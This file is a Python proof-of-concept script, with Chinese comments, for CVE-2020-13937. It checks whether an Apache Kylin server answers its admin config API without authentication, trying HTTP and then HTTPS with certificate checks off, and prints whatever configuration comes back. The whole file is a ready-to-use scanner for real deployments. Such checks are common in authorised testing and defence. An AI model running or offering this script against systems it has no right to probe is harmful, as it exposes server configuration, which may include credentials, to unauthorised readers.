#!/bin/bash/env python3
# _*_ coding:utf-8 _*_

import requests
import sys

def title():
    print("详细信息： Apache Kylin API未授权访问漏洞（CVE-2020-13937）")
    print("使用格式： python CVE-2020-13937_Apache_Kylin.py 1.1.1.1:80")

def run_https(ip, port):
    requests.packages.urllib3.disable_warnings()
    print("https")
    url = "https://{}:{}/kylin/api/admin/config".format(ip, port)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        req = requests.get(url=url, headers=headers, verify=False, timeout=3)
        req_len = len(req.text)
        if req.status_code == 200 and 'config:' in req.text and req_len > 666:
            return True
        else:
            return False
    except Exception as e:
        return False

def run(ip, port):
    url = "http://{}:{}/kylin/api/admin/config".format(ip, port)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        req = requests.get(url=url, headers=headers, timeout=3)
        print(req.text)
        req_len = len(req.text)
        if req.status_code == 200 and 'config' in req.text and req_len > 666:
            return True
        else:
            return run_https(ip, port)
    except Exception as e:
        return run_https(ip, port)

if __name__ == '__main__':
    title()

    target = sys.argv[1]
    #target = '192.168.1.234:7070'
    ip = target.split(':')[0]
    port = int(target.split(':')[1])

    result = run(ip, port)
    if result:
        print("Exist")
    else:
        print("UnExist")
